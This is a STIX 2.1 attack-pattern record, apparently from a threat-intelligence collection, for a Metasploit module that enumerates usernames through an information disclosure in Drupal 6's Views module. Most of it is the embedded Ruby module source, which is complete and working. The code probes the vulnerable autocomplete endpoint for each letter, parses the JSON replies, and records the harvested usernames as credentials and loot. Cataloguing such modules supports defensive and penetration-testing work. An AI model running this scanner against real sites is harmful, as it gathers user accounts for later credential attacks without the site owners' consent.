{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--166ce846-3892-42f1-a084-ea32def2b0a4",
    "created": "2024-08-14T16:29:07.604029Z",
    "modified": "2024-08-14T16:29:07.604033Z",
    "name": "Drupal Views Module Users Enumeration",
    "description": " This module exploits an information disclosure vulnerability in the 'Views' module of Drupal, brute-forcing the first 10 usernames from 'a' to 'z'. Drupal 6 with 'Views' module <= 6.x-2.11 are vulnerable.  Drupal does not consider disclosure of usernames as a weakness. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/drupal_views_user_enum.rb",
            "external_id": "drupal_views_user_enum.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.madirish.net/node/465"
        },
        {
            "source_name": "reference",
            "url": "https://www.drupal.org/node/1004778"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::WmapScanServer\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Drupal Views Module Users Enumeration',\n      'Description'    => %q{\n        This module exploits an information disclosure vulnerability in the 'Views'\n        module of Drupal, brute-forcing the first 10 usernames from 'a' to 'z'.\n        Drupal 6 with 'Views' module <= 6.x-2.11 are vulnerable.  Drupal does not\n        consider disclosure of usernames as a weakness.\n      },\n      'Author'         =>\n        [\n          'Justin Klein Keane', #Original Discovery\n          'Robin Francois <rof[at]navixia.com>',\n          'Brandon McCann \"zeknox\" <bmccann[at]accuvant.com>'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'http://www.madirish.net/node/465'],\n          ['URL', 'https://www.drupal.org/node/1004778'],\n        ],\n      'DisclosureDate' => '2010-07-02'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, \"Drupal Path\", \"/\"])\n      ])\n  end\n\n  def base_uri\n    @base_uri ||= normalize_uri(\"#{target_uri.path}/?q=admin/views/ajax/autocomplete/user/\")\n  end\n\n  def check_host(ip)\n    res = send_request_cgi(\n      'uri'     => base_uri,\n      'method'  => 'GET',\n      'headers' => { 'Connection' => 'Close' }\n    )\n\n    unless res\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.body.include?('Access denied')\n      # This probably means the Views Module actually isn't installed\n      print_error(\"Access denied\")\n      return Exploit::CheckCode::Safe\n    elsif res.message != 'OK' || res.body != '[  ]'\n      return Exploit::CheckCode::Safe\n    else\n      return Exploit::CheckCode::Appears\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: (ssl ? 'https' : 'http'),\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user]\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run_host(ip)\n    # Check if remote host is available or appears vulnerable\n    unless check_host(ip) == Exploit::CheckCode::Appears\n      print_error(\"#{ip} does not appear to be vulnerable, will not continue\")\n      return\n    end\n\n    print_status(\"Begin enumerating users at #{vhost}\")\n\n    results = []\n    ('a'..'z').each do |l|\n      vprint_status(\"Iterating on letter: #{l}\")\n\n      res = send_request_cgi(\n        'uri'     => \"#{base_uri}#{l}\",\n        'method'  => 'GET',\n        'headers' => { 'Connection' => 'Close' }\n      )\n\n      if res && res.message == 'OK'\n        begin\n          user_list = JSON.parse(res.body)\n        rescue JSON::ParserError => e\n          elog('Exception encountered parsing JSON response', error: e)\n          return []\n        end\n        if user_list.empty?\n          vprint_error(\"Not found with: #{l}\")\n        else\n          vprint_good(\"Found: #{user_list}\")\n          results << user_list.flatten.uniq\n        end\n      else\n        print_error(\"Unexpected results from server\")\n        return\n      end\n    end\n    results = results.flatten.uniq\n    print_status(\"Done. #{results.length} usernames found...\")\n    results.each do |user|\n      print_good(\"Found User: #{user}\")\n\n      report_cred(\n        ip: Rex::Socket.getaddress(datastore['RHOST']),\n        port: datastore['RPORT'],\n        user: user,\n        proof: base_uri\n      )\n    end\n\n    results = results * \"\\n\"\n    p = store_loot(\n      'drupal_user',\n      'text/plain',\n      Rex::Socket.getaddress(datastore['RHOST']),\n      results.to_s,\n      'drupal_user.txt'\n    )\n    print_status(\"Usernames stored in: #{p}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-07-02"
}